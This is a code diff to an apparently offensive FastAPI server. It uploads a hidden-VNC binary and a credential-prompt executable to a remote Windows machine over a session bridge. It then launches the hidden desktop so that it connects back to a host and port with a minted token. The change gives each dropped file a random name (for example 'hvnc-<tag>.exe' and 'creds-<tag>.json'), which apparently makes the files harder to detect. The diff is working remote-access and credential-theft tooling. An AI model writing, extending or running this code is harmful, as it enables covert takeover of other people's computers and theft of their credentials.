@@ -718,16 +718,20 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         token = await run_in_threadpool(broker.mint, session_id)
         remote = body.get("dir") or "C:\\\\ProgramData"
         remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
+        tag = secrets.token_hex(3)
+        hvnc_name = f"hvnc-{tag}.exe"
+        prompt_name = f"cred-{tag}.exe"
+        creds_name = f"creds-{tag}.json"
         try:
             await run_in_threadpool(
-                app.state.bridge.upload, session_id, remote, "hvnc.exe", hvnc_bin.read_bytes()
+                app.state.bridge.upload, session_id, remote, hvnc_name, hvnc_bin.read_bytes()
             )
             if prompt_bin.is_file():
                 await run_in_threadpool(
                     app.state.bridge.upload,
                     session_id,
                     remote,
-                    "credprompt.exe",
+                    prompt_name,
                     prompt_bin.read_bytes(),
                 )
         except BridgeError as exc:
@@ -738,9 +742,9 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         port = port or "8443"
         spawn = body.get("spawn") or "explorer.exe"
         desktop = body.get("desktop") or "FleetHVNC"
-        hvnc_path = ntpath.join(remote, "hvnc.exe")
-        creds_path = ntpath.join(remote, "fleet-creds.json")
-        prompt_path = ntpath.join(remote, "credprompt.exe")
+        hvnc_path = ntpath.join(remote, hvnc_name)
+        creds_path = ntpath.join(remote, creds_name)
+        prompt_path = ntpath.join(remote, prompt_name)
         args = [
             "--host", host, "--port", port, "--session", session_id,
             "--token", token, "--desktop", desktop, "--spawn", spawn,
